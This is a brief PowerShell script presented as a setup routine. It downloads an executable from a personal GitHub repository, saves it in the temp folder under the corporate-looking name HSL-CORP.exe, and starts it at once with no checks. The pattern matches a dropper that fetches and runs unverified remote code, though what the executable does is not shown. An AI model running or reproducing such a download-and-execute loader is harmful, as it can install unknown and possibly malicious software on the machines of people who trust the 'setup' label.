Write-Host "Setup Started..."

$url = "https://raw.githubusercontent.com/crazyxyz673-lang/HSLCORP-INTERNAL/main/JATIN.exe"
$output = "$env:TEMP\HSL-CORP.exe"

Invoke-WebRequest -Uri $url -OutFile $output

Write-Host "Running App..."
Start-Process $output
